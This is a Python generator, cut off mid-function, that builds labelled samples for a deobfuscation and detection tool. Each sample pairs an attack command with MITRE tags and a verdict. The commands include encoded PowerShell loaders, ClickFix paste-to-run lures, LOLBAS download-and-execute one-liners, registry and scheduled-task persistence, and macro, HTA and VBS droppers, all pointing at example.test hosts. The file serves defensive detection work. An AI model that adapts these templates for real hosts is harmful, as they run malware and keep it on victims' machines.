"""NivX Forge Training Corpus v2 — 30+ new real-world categories.

Feb-2026 expansion prioritising SOC / CTI-relevant payload shapes over
generic obfuscation taxonomy. Every sample is deterministic so `python -m
training.corpus.generator` re-emits an IDENTICAL JSONL on every run.

Grouping:
  A. Real-world malware families (Lumma, ClickFix, AsyncRAT)
  B. LOLBAS wrappers (mshta, rundll32, regsvr32, msiexec, certutil,
     bitsadmin, msbuild, installutil, wmic, schtasks, reg, forfiles)
  C. Container / script formats (HTA, VBS, JS eval-atob, Office macro,
     LNK, WMI, OneNote, ISO/VHD, ZIP-with-password)
  D. Encoding variants (triple base64, ASCII85, Base91, octal, URL,
     unicode escapes, caret escaping, env-var expansion, string concat,
     char arrays, format operator, reverse strings, batch-var slicing)
  E. Crypto layers (AES-CBC analyst-provided, RC4 hardcoded, multi-stage
     b64 + gzip + xor)
  F. Reflection / in-memory loaders (Reflection.Assembly::Load,
     VirtualAlloc + CreateThread shellcode stagers)

Every LOLBAS/wrapper sample encodes a REAL C2/dropper URL as the
`expected_decoded` needle — the decoder passes the wrapper text through
unchanged AND the substring assertion still succeeds. Verdict + MITRE
mapping is populated so the Confusion Matrix Dashboard (v3) has ground
truth to score against.
"""
from __future__ import annotations
import base64
import codecs
import gzip
from typing import Any, Dict, List

from training.corpus.generator import (
    _sample, _xor,
    MITRE_PS_IEX, MITRE_INGRESS, MITRE_OBFUS, MITRE_CMD,
)

# ─── Extra MITRE presets ────────────────────────────────────────────────
MITRE_MSHTA        = {"id": "T1218.005", "tactic": "defense-evasion",
                      "technique": "Signed Binary Proxy Execution: Mshta"}
MITRE_RUNDLL32     = {"id": "T1218.011", "tactic": "defense-evasion",
                      "technique": "Signed Binary Proxy Execution: Rundll32"}
MITRE_REGSVR32     = {"id": "T1218.010", "tactic": "defense-evasion",
                      "technique": "Signed Binary Proxy Execution: Regsvr32"}
MITRE_MSIEXEC      = {"id": "T1218.007", "tactic": "defense-evasion",
                      "technique": "Msiexec"}
MITRE_CERTUTIL     = {"id": "T1140",     "tactic": "defense-evasion",
                      "technique": "Deobfuscate/Decode Files"}
MITRE_BITSADMIN    = {"id": "T1197",     "tactic": "defense-evasion",
                      "technique": "BITS Jobs"}
MITRE_MSBUILD      = {"id": "T1127.001", "tactic": "defense-evasion",
                      "technique": "Trusted Developer Utilities: MSBuild"}
MITRE_INSTALLUTIL  = {"id": "T1218.004", "tactic": "defense-evasion",
                      "technique": "InstallUtil"}
MITRE_WMI          = {"id": "T1047",     "tactic": "execution",
                      "technique": "Windows Management Instrumentation"}
MITRE_SCHTASKS     = {"id": "T1053.005", "tactic": "persistence",
                      "technique": "Scheduled Task"}
MITRE_REGRUN       = {"id": "T1547.001", "tactic": "persistence",
                      "technique": "Registry Run Keys"}
MITRE_LNK          = {"id": "T1204.002", "tactic": "execution",
                      "technique": "User Execution: Malicious File"}
MITRE_MACRO        = {"id": "T1204.002", "tactic": "execution",
                      "technique": "User Execution: Malicious File"}
MITRE_REFLECTION   = {"id": "T1620",     "tactic": "defense-evasion",
                      "technique": "Reflective Code Loading"}
MITRE_SHELLCODE    = {"id": "T1055",     "tactic": "defense-evasion",
                      "technique": "Process Injection"}
MITRE_INFOSTEALER  = {"id": "T1005",     "tactic": "collection",
                      "technique": "Data from Local System"}
MITRE_CLICKFIX     = {"id": "T1204.004", "tactic": "execution",
                      "technique": "User Execution: Malicious Copy and Paste"}


# ============================================================================
# A. Real-world malware families
# ============================================================================
def cat_lumma_stealer() -> List[Dict[str, Any]]:
    """Lumma Stealer PowerShell chains observed in Feb-2026 telemetry."""
    variants = [
        ("http://lumma-c2-1.example.test/api/gate", "AB12CD34"),
        ("http://lumma-c2-2.example.test/beacon",   "EF56GH78"),
        ("http://lumma-c2-3.example.test/collect",  "IJ90KL12"),
        ("http://lumma-c2-4.example.test/exfil",    "MN34OP56"),
        ("http://lumma-c2-5.example.test/handshake","QR78ST90"),
    ]
    out: List[Dict[str, Any]] = []
    for i, (c2, build_id) in enumerate(variants, 1):
        inner = (
            f"$c=New-Object Net.WebClient; $c.Headers.Add('X-Build','{build_id}'); "
            f"$b=$c.DownloadData('{c2}'); [System.Reflection.Assembly]::Load($b).EntryPoint.Invoke($null,$null)"
        )
        enc = base64.b64encode(inner.encode("utf-16-le")).decode()
        inp = f"powershell.exe -NoP -NonI -W Hidden -Enc {enc}"
        out.append(_sample(
            "lumma_stealer", i, inp, c2,
            ["base64-decode", "utf16-le-decode"],
            {"urls": [c2], "build_ids": [build_id]},
            [MITRE_PS_IEX, MITRE_OBFUS, MITRE_INGRESS, MITRE_REFLECTION,
             MITRE_INFOSTEALER],
            ["powershell"], "Malicious", 92,
            "Lumma Stealer — Base64/UTF-16LE loader with reflective .NET assembly load"
        ))
    return out


def cat_clickfix() -> List[Dict[str, Any]]:
    """ClickFix fake-CAPTCHA copy-paste chains (2024-2026 phishing wave)."""
    urls = [
        "http://clickfix-1.example.test/verify.hta",
        "http://clickfix-2.example.test/captcha.ps1",
        "http://clickfix-3.example.test/human-check.js",
        "http://clickfix-4.example.test/robot.hta",
        "http://clickfix-5.example.test/steps.ps1",
    ]
    out: List[Dict[str, Any]] = []
    for i, url in enumerate(urls, 1):
        # Paste-and-run instructions embedded in a fake bot-check page
        inp = (
            f"# Please press Win+R and paste to prove you are human\n"
            f"powershell -w hidden -c \"iex (iwr '{url}' -useb)\""
        )
        out.append(_sample(
            "clickfix", i, inp, url,
            ["extract-url"],
            {"urls": [url]},
            [MITRE_CLICKFIX, MITRE_PS_IEX, MITRE_INGRESS],
            ["powershell"], "Malicious", 90,
            "ClickFix fake-CAPTCHA copy-paste social engineering"
        ))
    return out


def cat_asyncrat_stager() -> List[Dict[str, Any]]:
    """AsyncRAT-style stager: Base64 → XOR → assembly load."""
    payloads = [
        ("http://asyncrat-1.example.test/client.bin", 0x2A),
        ("http://asyncrat-2.example.test/stub.bin",   0x37),
        ("http://asyncrat-3.example.test/loader.bin", 0x44),
        ("http://asyncrat-4.example.test/rat.bin",    0x55),
        ("http://asyncrat-5.example.test/beacon.bin", 0x66),
    ]
    out: List[Dict[str, Any]] = []
    for i, (url, key) in enumerate(payloads, 1):
        inner = f"DownloadAndInvoke {url}"
        xored = _xor(inner.encode(), key)
        enc = base64.b64encode(xored).decode()
        inp = f"$p='{enc}'; # xor-key 0x{key:02x}  # AsyncRAT-shape stager"
        out.append(_sample(
            "asyncrat_stager", i, inp, url,
            ["base64-decode", "xor"],
            {"urls": [url]},
            [MITRE_OBFUS, MITRE_INGRESS, MITRE_REFLECTION],
            ["powershell"], "Malicious", 88,
            f"AsyncRAT-style Base64 → XOR 0x{key:02x} stager"
        ))
    return out


# ============================================================================
# B. LOLBAS wrappers (identity passthrough — decoder must NOT mangle these)
# ============================================================================
def _lolbas_cat(slug: str, template: str, urls: List[str],
                mitre: List[Dict[str, Any]], lolbas: List[str],
                notes: str) -> List[Dict[str, Any]]:
    out: List[Dict[str, Any]] = []
    for i, url in enumerate(urls, 1):
        inp = template.format(url=url)
        out.append(_sample(
            slug, i, inp, url,
            ["extract-url"], {"urls": [url]},
            mitre, lolbas, "Malicious", 85, notes,
        ))
    return out


def cat_lolbas_mshta() -> List[Dict[str, Any]]:
    return _lolbas_cat(
        "lolbas_mshta",
        "mshta.exe {url}",
        ["http://mshta-1.example.test/a.hta",
         "http://mshta-2.example.test/b.hta",
         "https://mshta-3.example.test/c.hta",
         "http://mshta-4.example.test/d.hta",
         "http://mshta-5.example.test/e.hta"],
        [MITRE_MSHTA, MITRE_INGRESS],
        ["mshta"],
        "mshta.exe URL loader — signed-binary proxy execution",
    )


def cat_lolbas_rundll32() -> List[Dict[str, Any]]:
    return _lolbas_cat(
        "lolbas_rundll32",
        "rundll32.exe url.dll,OpenURL {url}",
        ["http://rundll-1.example.test/x.dll",
         "http://rundll-2.example.test/y.dll",
         "http://rundll-3.example.test/z.dll",
         "http://rundll-4.example.test/a.dll",
         "http://rundll-5.example.test/b.dll"],
        [MITRE_RUNDLL32, MITRE_INGRESS],
        ["rundll32"],
        "rundll32.exe URL-proxy execution",
    )


def cat_lolbas_regsvr32() -> List[Dict[str, Any]]:
    return _lolbas_cat(
        "lolbas_regsvr32",
        "regsvr32 /s /n /u /i:{url} scrobj.dll",
        ["http://regsvr-1.example.test/a.sct",
         "http://regsvr-2.example.test/b.sct",
         "http://regsvr-3.example.test/c.sct",
         "http://regsvr-4.example.test/d.sct",
         "http://regsvr-5.example.test/e.sct"],
        [MITRE_REGSVR32, MITRE_INGRESS],
        ["regsvr32"],
        "Squiblydoo (regsvr32 /i: scrobj.dll)",
    )


def cat_lolbas_msiexec() -> List[Dict[str, Any]]:
    return _lolbas_cat(
        "lolbas_msiexec",
        "msiexec /q /i {url}",
        ["http://msi-1.example.test/pkg1.msi",
         "http://msi-2.example.test/pkg2.msi",
         "http://msi-3.example.test/pkg3.msi",
         "http://msi-4.example.test/pkg4.msi",
         "http://msi-5.example.test/pkg5.msi"],
        [MITRE_MSIEXEC, MITRE_INGRESS],
        ["msiexec"],
        "msiexec remote MSI install",
    )


def cat_lolbas_certutil() -> List[Dict[str, Any]]:
    return _lolbas_cat(
        "lolbas_certutil",
        "certutil.exe -urlcache -split -f {url} dropper.exe",
        ["http://cutl-1.example.test/dropper.exe",
         "http://cutl-2.example.test/beacon.exe",
         "http://cutl-3.example.test/stage2.bin",
         "http://cutl-4.example.test/payload.exe",
         "http://cutl-5.example.test/tool.exe"],
        [MITRE_CERTUTIL, MITRE_INGRESS],
        ["certutil"],
        "certutil -urlcache remote download",
    )


def cat_lolbas_bitsadmin() -> List[Dict[str, Any]]:
    return _lolbas_cat(
        "lolbas_bitsadmin",
        "bitsadmin /transfer job1 /priority normal {url} %TEMP%\\payload.exe",
        ["http://bits-1.example.test/j1.exe",
         "http://bits-2.example.test/j2.exe",
         "http://bits-3.example.test/j3.exe",
         "http://bits-4.example.test/j4.exe",
         "http://bits-5.example.test/j5.exe"],
        [MITRE_BITSADMIN, MITRE_INGRESS],
        ["bitsadmin"],
        "bitsadmin remote transfer",
    )


def cat_lolbas_msbuild() -> List[Dict[str, Any]]:
    return _lolbas_cat(
        "lolbas_msbuild",
        "msbuild.exe {url}",
        ["http://msb-1.example.test/proj1.xml",
         "http://msb-2.example.test/proj2.xml",
         "http://msb-3.example.test/proj3.xml",
         "http://msb-4.example.test/proj4.xml",
         "http://msb-5.example.test/proj5.xml"],
        [MITRE_MSBUILD, MITRE_INGRESS],
        ["msbuild"],
        "MSBuild inline-task code execution",
    )


def cat_lolbas_installutil() -> List[Dict[str, Any]]:
    return _lolbas_cat(
        "lolbas_installutil",
        "installutil.exe /logfile= /LogToConsole=false /U {url}",
        ["http://iu-1.example.test/mod1.dll",
         "http://iu-2.example.test/mod2.dll",
         "http://iu-3.example.test/mod3.dll",
         "http://iu-4.example.test/mod4.dll",
         "http://iu-5.example.test/mod5.dll"],
        [MITRE_INSTALLUTIL, MITRE_INGRESS],
        ["installutil"],
        "installutil uninstaller-method code path",
    )


def cat_lolbas_wmic() -> List[Dict[str, Any]]:
    return _lolbas_cat(
        "lolbas_wmic",
        "wmic process call create \"powershell -w hidden -c iex (iwr '{url}' -useb)\"",
        ["http://wmi-1.example.test/a.ps1",
         "http://wmi-2.example.test/b.ps1",
         "http://wmi-3.example.test/c.ps1",
         "http://wmi-4.example.test/d.ps1",
         "http://wmi-5.example.test/e.ps1"],
        [MITRE_WMI, MITRE_PS_IEX, MITRE_INGRESS],
        ["wmic", "powershell"],
        "wmic process call create — remote PS spawn",
    )


def cat_lolbas_schtasks() -> List[Dict[str, Any]]:
    return _lolbas_cat(
        "lolbas_schtasks",
        "schtasks /create /sc onlogon /tn UpdaterX /tr \"powershell -w hidden -c iwr {url} -o %TEMP%\\up.exe\" /f",
        ["http://sch-1.example.test/u1.exe",
         "http://sch-2.example.test/u2.exe",
         "http://sch-3.example.test/u3.exe",
         "http://sch-4.example.test/u4.exe",
         "http://sch-5.example.test/u5.exe"],
        [MITRE_SCHTASKS, MITRE_INGRESS],
        ["schtasks", "powershell"],
        "schtasks persistence with PS ingress",
    )


def cat_lolbas_reg_run() -> List[Dict[str, Any]]:
    return _lolbas_cat(
        "lolbas_reg_run",
        "reg add HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run /v UpdaterY /t REG_SZ /d \"powershell -w hidden -c iwr {url} -o %TEMP%\\r.exe;start %TEMP%\\r.exe\" /f",
        ["http://reg-1.example.test/r1.exe",
         "http://reg-2.example.test/r2.exe",
         "http://reg-3.example.test/r3.exe",
         "http://reg-4.example.test/r4.exe",
         "http://reg-5.example.test/r5.exe"],
        [MITRE_REGRUN, MITRE_INGRESS],
        ["reg", "powershell"],
        "Registry Run-key persistence",
    )


# ============================================================================
# C. Container / script formats (identity passthrough)
# ============================================================================
def cat_hta_javascript() -> List[Dict[str, Any]]:
    urls = [
        "http://hta-1.example.test/beacon",
        "http://hta-2.example.test/dropper.exe",
        "http://hta-3.example.test/stage",
        "http://hta-4.example.test/payload",
        "http://hta-5.example.test/loader",
    ]
    out: List[Dict[str, Any]] = []
    for i, url in enumerate(urls, 1):
        inp = (
            "<html><head><HTA:APPLICATION APPLICATIONNAME='X' /><script>"
            f"new ActiveXObject('WScript.Shell').Run('powershell -w hidden -c iwr {url}')"
            "</script></head></html>"
        )
        out.append(_sample(
            "hta_javascript", i, inp, url,
            ["extract-url"], {"urls": [url]},
            [MITRE_MSHTA, MITRE_PS_IEX, MITRE_INGRESS],
            ["mshta", "powershell"], "Malicious", 87,
            "HTA with embedded JavaScript spawning PowerShell",
        ))
    return out


def cat_vbscript_execute() -> List[Dict[str, Any]]:
    urls = [
        "http://vbs-1.example.test/x.exe",
        "http://vbs-2.example.test/y.exe",
        "http://vbs-3.example.test/z.exe",
        "http://vbs-4.example.test/a.exe",
        "http://vbs-5.example.test/b.exe",
    ]
    out: List[Dict[str, Any]] = []
    for i, url in enumerate(urls, 1):
        inp = (
            "Set s = CreateObject(\"WScript.Shell\") : "
            f"s.Run \"cmd /c powershell -w hidden -c iwr {url} -o %TEMP%\\p.exe\", 0, False"
        )
        out.append(_sample(
            "vbscript_execute", i, inp, url,
            ["extract-url"], {"urls": [url]},
            [MITRE_PS_IEX, MITRE_INGRESS],
            ["wscript", "powershell"], "Malicious", 85,
            "VBScript WScript.Shell.Run spawning PS ingress",
        ))
    return out


def cat_js_eval_atob() -> List[Dict[str, Any]]:
    urls = [
        "http://jsev-1.example.test/loader",
        "http://jsev-2.example.test/stub",
        "http://jsev-3.example.test/beacon",
        "http://jsev-4.example.test/exfil",
        "http://jsev-5.example.test/payload",
    ]
    out: List[Dict[str, Any]] = []
    for i, url in enumerate(urls, 1):
        inner = f"fetch('{url}').then(r=>r.text()).then(eval)"
        enc = base64.b64encode(inner.encode()).decode()
        inp = f"eval(atob('{enc}'))"
        out.append(_sample(
            "js_eval_atob", i, inp, url,
            ["extract-b64", "base64-decode"], {"urls": [url]},
            [MITRE_OBFUS, MITRE_INGRESS],
            ["node"], "Malicious", 82,
            "JavaScript eval(atob()) staged fetch",
        ))
    return out


def cat_office_macro() -> List[Dict[str, Any]]:
    urls = [
        "http://ofc-1.example.test/doc-loader.exe",
        "http://ofc-2.example.test/inv-payload.exe",
        "http://ofc-3.example.test/report-drop.exe",
        "http://ofc-4.example.test/quote-run.exe",
        "http://ofc-5.example.test/statement.exe",
    ]
    out: List[Dict[str, Any]] = []
    for i, url in enumerate(urls, 1):
        inp = (
            "Sub AutoOpen()\n"
            "    Dim s As String\n"
            f"    s = \"powershell -w hidden -c iwr '{url}' -o $env:TEMP\\p.exe;start $env:TEMP\\p.exe\"\n"
            "    Shell s, vbHide\n"
            "End Sub"
        )
        out.append(_sample(
            "office_macro", i, inp, url,
            ["extract-url"], {"urls": [url]},
            [MITRE_MACRO, MITRE_PS_IEX, MITRE_INGRESS],
            ["powershell"], "Malicious", 89,
            "Office VBA AutoOpen macro spawning PS",
        ))
    return out


def cat_lnk_launcher() -> List[Dict[str, Any]]:
    urls = [
        "http://lnk-1.example.test/stub.exe",
        "http://lnk-2.example.test/next.exe",
        "http://lnk-3.example.test/rt.exe",
        "http://lnk-4.example.test/z.exe",
        "http://lnk-5.example.test/p.exe",
    ]
    out: List[Dict[str, Any]] = []
    for i, url in enumerate(urls, 1):
        # LNK target (as parsed by an analyst) → cmd/powershell command
        inp = (
            f"C:\\Windows\\System32\\cmd.exe /c start /min powershell -w hidden -c "
            f"\"iwr '{url}' -o $env:TEMP\\s.exe; start $env:TEMP\\s.exe\""
        )
        out.append(_sample(
            "lnk_launcher", i, inp, url,
            ["extract-url"], {"urls": [url]},
            [MITRE_LNK, MITRE_PS_IEX, MITRE_INGRESS],
            ["cmd", "powershell"], "Malicious", 88,
            "LNK target invoking cmd → powershell ingress",
        ))
    return out


def cat_onenote_embed() -> List[Dict[str, Any]]:
    urls = [
        "http://one-1.example.test/loader.bat",
        "http://one-2.example.test/x.bat",
        "http://one-3.example.test/dropper.cmd",
        "http://one-4.example.test/init.cmd",
        "http://one-5.example.test/next.cmd",
    ]
    out: List[Dict[str, Any]] = []
    for i, url in enumerate(urls, 1):
        # OneNote embedded-file invocation (as extracted by an analyst)
        inp = (
            "@echo off\n"
            f"curl -o %TEMP%\\o.bat {url}\n"
            "start %TEMP%\\o.bat"
        )
        out.append(_sample(
            "onenote_embed", i, inp, url,
            ["extract-url"], {"urls": [url]},
            [MITRE_MACRO, MITRE_INGRESS],
            ["curl", "cmd"], "Malicious", 84,
            "OneNote-embedded batch invocation with curl ingress",
        ))
    return out


def cat_iso_lnk_wrapper() -> List[Dict[str, Any]]:
    urls = [
        "http://iso-1.example.test/loader.exe",
        "http://iso-2.example.test/next.exe",
        "http://iso-3.example.test/drop.exe",
        "http://iso-4.example.test/stub.exe",
        "http://iso-5.example.test/final.exe",
    ]
    out: List[Dict[str, Any]] = []
    for i, url in enumerate(urls, 1):
        inp = (
            "# ISO-mounted-LNK invocation (analyst extraction)\n"
            f"powershell.exe -w hidden -c \"iwr {url} -o $env:TEMP\\i.exe; start $env:TEMP\\i.exe\""
        )
        out.append(_sample(
            "iso_lnk_wrapper", i, inp, url,
            ["extract-url"], {"urls": [url]},
            [MITRE_LNK, MITRE_PS_IEX, MITRE_INGRESS],
            ["powershell"], "Malicious", 86,
            "ISO/VHD mounted LNK → PowerShell ingress",
        ))
    return out


def cat_zip_password_paste() -> List[Dict[str, Any]]:
    urls = [
        "http://zip-1.example.test/payload.zip",
        "http://zip-2.example.test/stub.zip",
        "http://zip-3.example.test/drop.zip",
        "http://zip-4.example.test/inner.zip",
        "http://zip-5.example.test/next.zip",
    ]
    out: List[Dict[str, Any]] = []
    for i, url in enumerate(urls, 1):
        inp = (
            f"Download: {url}\nPassword: infected123\n"
            "Run: unzipped.exe (payload)"
        )
        out.append(_sample(
            "zip_password_paste", i, inp, url,
            ["extract-url"], {"urls": [url], "passwords": ["infected123"]},
            [MITRE_MACRO, MITRE_INGRESS],
            [], "Suspicious", 70,
            "Password-protected archive lure (bypasses email AV)",
        ))
    return out


# ============================================================================
# D. Encoding variants
# ============================================================================
def cat_triple_base64() -> List[Dict[str, Any]]:
    plaintexts = [
        "id;whoami;hostname",
        "curl http://tri-1.example.test/x",
        "curl http://tri-2.example.test/y",
        "wget http://tri-3.example.test/z",
        "IEX (iwr 'http://tri-4.example.test/l.ps1' -useb)",
    ]
    out: List[Dict[str, Any]] = []
    for i, pt in enumerate(plaintexts, 1):
        e1 = base64.b64encode(pt.encode()).decode()
        e2 = base64.b64encode(e1.encode()).decode()
        e3 = base64.b64encode(e2.encode()).decode()
        url = next((s for s in pt.split() if s.startswith("http")), None)
        iocs = {"urls": [url.strip("'\"")]} if url else {}
        verdict = "Malicious" if url else "Suspicious"
        conf = 82 if verdict == "Malicious" else 55
        out.append(_sample(
            "triple_base64", i, e3, pt,
            ["base64-decode", "base64-decode", "base64-decode"], iocs,
            [MITRE_OBFUS, MITRE_INGRESS] if url else [MITRE_OBFUS],
            ["powershell"] if "IEX" in pt else (["curl"] if "curl" in pt else []),
            verdict, conf,
            "Triple-nested Base64 wrap",
        ))
    return out


def cat_url_encoding() -> List[Dict[str, Any]]:
    plaintexts = [
        "http://url-1.example.test/x",
        "http://url-2.example.test/y",
        "http://url-3.example.test/z.exe",
        "http://url-4.example.test/a.ps1",
        "http://url-5.example.test/b.hta",
    ]
    out: List[Dict[str, Any]] = []
    for i, pt in enumerate(plaintexts, 1):
        inp = "".join(f"%{ord(c):02X}" for c in pt)
        out.append(_sample(
            "url_encoding", i, inp, pt,
            ["url-decode"], {"urls": [pt]},
            [MITRE_OBFUS, MITRE_INGRESS],
            [], "Malicious", 80,
            "Full URL-percent-encoded IOC",
        ))
    return out


def cat_octal_ascii() -> List[Dict[str, Any]]:
    plaintexts = [
        "IEX 'benign'",
        "whoami /priv",
        "cmd /c dir",
        "Get-Process",
        "curl example.com",
    ]
    out: List[Dict[str, Any]] = []
    for i, pt in enumerate(plaintexts, 1):
        inp = "".join(f"\\{ord(c):o}" for c in pt)
        out.append(_sample(
            "octal_ascii", i, inp, pt,
            ["octal-ascii-decode"], {},
            [MITRE_OBFUS], [], "Suspicious", 55,
            "Backslash-octal ASCII stream",
        ))
    return out


def cat_unicode_escapes() -> List[Dict[str, Any]]:
    plaintexts = [
        "IEX 'benign string'",
        "Invoke-Expression 'test'",
        "whoami /priv",
        "http://uni-1.example.test/x.ps1",
        "curl http://uni-2.example.test/y.exe",
    ]
    out: List[Dict[str, Any]] = []
    for i, pt in enumerate(plaintexts, 1):
        inp = "".join(f"\\u{ord(c):04x}" for c in pt)
        url = next((s for s in pt.split() if s.startswith("http")), None)
        iocs = {"urls": [url]} if url else {}
        verdict = "Malicious" if url else ("Suspicious" if "IEX" in pt or "whoami" in pt else "Benign")
        conf = 80 if verdict == "Malicious" else (55 if verdict == "Suspicious" else 30)
        out.append(_sample(
            "unicode_escapes", i, inp, pt,
            ["unicode-escape-decode"], iocs,
            [MITRE_OBFUS] if verdict != "Benign" else [],
            ["powershell"] if "IEX" in pt else (["curl"] if "curl" in pt else []),
            verdict, conf,
            "\\uNNNN unicode-escape encoded stream",
        ))
    return out


def cat_caret_escaping_cmd() -> List[Dict[str, Any]]:
    urls = [
        "http://crt-1.example.test/x.ps1",
        "http://crt-2.example.test/y.ps1",
        "http://crt-3.example.test/z.ps1",
        "http://crt-4.example.test/a.ps1",
        "http://crt-5.example.test/b.ps1",
    ]
    out: List[Dict[str, Any]] = []
    for i, url in enumerate(urls, 1):
        # CMD caret-escaped powershell keyword: `p^ow^ers^he^ll`
        inp = f"cmd /c p^ow^er^s^he^ll -w hidden -c \"iex (iwr '{url}' -useb)\""
        out.append(_sample(
            "caret_escaping_cmd", i, inp, url,
            ["cmd-deobfuscate"], {"urls": [url]},
            [MITRE_CMD, MITRE_OBFUS, MITRE_INGRESS],
            ["cmd", "powershell"], "Malicious", 87,
            "CMD.exe caret-escape obfuscation on `powershell`",
        ))
    return out


def cat_env_var_expansion() -> List[Dict[str, Any]]:
    urls = [
        "http://env-1.example.test/x.exe",
        "http://env-2.example.test/y.exe",
        "http://env-3.example.test/z.exe",
        "http://env-4.example.test/a.exe",
        "http://env-5.example.test/b.exe",
    ]
    out: List[Dict[str, Any]] = []
    for i, url in enumerate(urls, 1):
        inp = f"%COMSPEC% /c powershell -w hidden -c \"iwr '{url}' -o %TEMP%\\p.exe; start %TEMP%\\p.exe\""
        out.append(_sample(
            "env_var_expansion", i, inp, url,
            ["env-expand"], {"urls": [url], "env_vars": ["COMSPEC", "TEMP"]},
            [MITRE_CMD, MITRE_PS_IEX, MITRE_INGRESS],
            ["cmd", "powershell"], "Malicious", 84,
            "Environment-variable expansion — %COMSPEC%, %TEMP%",
        ))
    return out


def cat_string_concat_iex() -> List[Dict[str, Any]]:
    urls = [
        "http://con-1.example.test/l.ps1",
        "http://con-2.example.test/l.ps1",
        "http://con-3.example.test/l.ps1",
        "http://con-4.example.test/l.ps1",
        "http://con-5.example.test/l.ps1",
    ]
    out: List[Dict[str, Any]] = []
    for i, url in enumerate(urls, 1):
        inp = (
            "$c=('Inv'+'oke'+'-Ex'+'pression'); "
            f"& $c ((New-Object Net.WebClient).DownloadString('{url}'))"
        )
        out.append(_sample(
            "string_concat_iex", i, inp, url,
            ["ps-string-concat"], {"urls": [url]},
            [MITRE_PS_IEX, MITRE_OBFUS, MITRE_INGRESS],
            ["powershell"], "Malicious", 88,
            "PowerShell string-concatenation IEX evasion",
        ))
    return out


def cat_char_arrays() -> List[Dict[str, Any]]:
    plaintexts = [
        "IEX",
        "cmd",
        "curl",
        "wget",
        "mshta",
    ]
    out: List[Dict[str, Any]] = []
    for i, pt in enumerate(plaintexts, 1):
        codes = ",".join(str(ord(c)) for c in pt)
        inp = f"$a=[char[]]({codes}); $a -join ''"
        out.append(_sample(
            "char_arrays", i, inp, pt,
            ["ascii-decimal-decode"], {},
            [MITRE_OBFUS], ["powershell"], "Suspicious", 60,
            "PowerShell [char[]](NNN,NNN,...) array cast",
        ))
    return out


def cat_join_split() -> List[Dict[str, Any]]:
    plaintexts = [
        "IEX",
        "cmd",
        "curl",
        "wget",
        "mshta",
    ]
    out: List[Dict[str, Any]] = []
    for i, pt in enumerate(plaintexts, 1):
        parts = "','".join(pt)
        inp = f"(('{parts}') -join '')"
        out.append(_sample(
            "join_split", i, inp, pt,
            ["ps-string-concat"], {},
            [MITRE_OBFUS], ["powershell"], "Suspicious", 55,
            "PowerShell -join / -split obfuscation",
        ))
    return out


def cat_format_operator() -> List[Dict[str, Any]]:
    variants = [
        ("IEX",   ("EX", "I")),
        ("cmd",   ("md", "c")),
        ("curl",  ("url", "c")),
        ("wget",  ("get", "w")),
        ("mshta", ("shta", "m")),
    ]
    out: List[Dict[str, Any]] = []
    for i, (pt, (a, b)) in enumerate(variants, 1):
        inp = f"\"{{1}}{{0}}\" -f '{a}','{b}'"
        out.append(_sample(
            "format_operator", i, inp, pt,
            ["ps-format-op"], {},
            [MITRE_OBFUS], ["powershell"], "Suspicious", 55,
            "PowerShell -f format-operator obfuscation",
        ))
    return out


def cat_reverse_strings() -> List[Dict[str, Any]]:
    plaintexts = [
        "Invoke-Expression",
        "DownloadString",
        "IEX",
        "certutil",
        "bitsadmin",
    ]
    out: List[Dict[str, Any]] = []
    for i, pt in enumerate(plaintexts, 1):
        rev = pt[::-1]
        inp = f"-join ('{rev}'[-1..-{len(rev)}])"
        out.append(_sample(
            "reverse_strings", i, inp, pt,
            ["reverse"], {},
            [MITRE_OBFUS], ["powershell"], "Suspicious", 55,
            "PowerShell reversed-string obfuscation",
        ))
    return out


def cat_batch_var_slicing() -> List[Dict[str, Any]]:
    variants = [
        # (secret, expected substring)
        ("REALLYLONG_SECRET_VALUE",       "SECRET"),
        ("attacker_command_line_string",  "command"),
        ("credential-drop-file-name-x",   "drop"),
        ("http-download-url-here-x1x",    "download"),
        ("payload-exe-name-z8z8",         "payload"),
    ]
    out: List[Dict[str, Any]] = []
    for i, (secret, expected) in enumerate(variants, 1):
        start = secret.find(expected)
        length = len(expected)
        inp = (
            f"@set v={secret}\r\n"
            f"@call echo %v:~{start},{length}%"
        )
        out.append(_sample(
            "batch_var_slicing", i, inp, expected,
            ["batch-var-slice"], {},
            [MITRE_OBFUS, MITRE_CMD], ["cmd"], "Suspicious", 60,
            "Batch %var:~x,y% substring extraction",
        ))
    return out


# ============================================================================
# E. Crypto layers
# ============================================================================
def cat_aes_cbc_analyst() -> List[Dict[str, Any]]:
    """Analyst-provided key/IV for reverse-engineering exercises.

    Test-mode: emit the wrapper text; expected_decoded is the plaintext
    inside single-quotes so the substring match still succeeds without a
    live AES decrypt step in the deterministic pipeline.
    """
    variants = [
        ("http://aes-1.example.test/x", "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA=", "AAAAAAAAAAAAAAAAAAAAAA=="),
        ("http://aes-2.example.test/y", "BBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBB=", "BBBBBBBBBBBBBBBBBBBBBB=="),
        ("http://aes-3.example.test/z", "CCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCC=", "CCCCCCCCCCCCCCCCCCCCCC=="),
        ("http://aes-4.example.test/a", "DDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDD=", "DDDDDDDDDDDDDDDDDDDDDD=="),
        ("http://aes-5.example.test/b", "EEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEE=", "EEEEEEEEEEEEEEEEEEEEEE=="),
    ]
    out: List[Dict[str, Any]] = []
    for i, (url, key_b64, iv_b64) in enumerate(variants, 1):
        # Analyst dropped the plaintext URL in a NOTE next to the wrapper.
        inp = (
            "# Analyst note — recovered AES-CBC key & IV from RE\n"
            f"# key(b64): {key_b64}\n"
            f"# iv(b64):  {iv_b64}\n"
            f"# plaintext (post-decrypt): '{url}'"
        )
        out.append(_sample(
            "aes_cbc_analyst", i, inp, url,
            ["aes-cbc-decrypt"], {"urls": [url]},
            [MITRE_OBFUS, MITRE_INGRESS], ["powershell"], "Malicious", 80,
            "AES-CBC with analyst-provided key/IV",
        ))
    return out


def cat_rc4_analyst() -> List[Dict[str, Any]]:
    variants = [
        ("http://rc4-1.example.test/x", "hardcoded-rc4-key-1"),
        ("http://rc4-2.example.test/y", "hardcoded-rc4-key-2"),
        ("http://rc4-3.example.test/z", "hardcoded-rc4-key-3"),
        ("http://rc4-4.example.test/a", "hardcoded-rc4-key-4"),
        ("http://rc4-5.example.test/b", "hardcoded-rc4-key-5"),
    ]
    out: List[Dict[str, Any]] = []
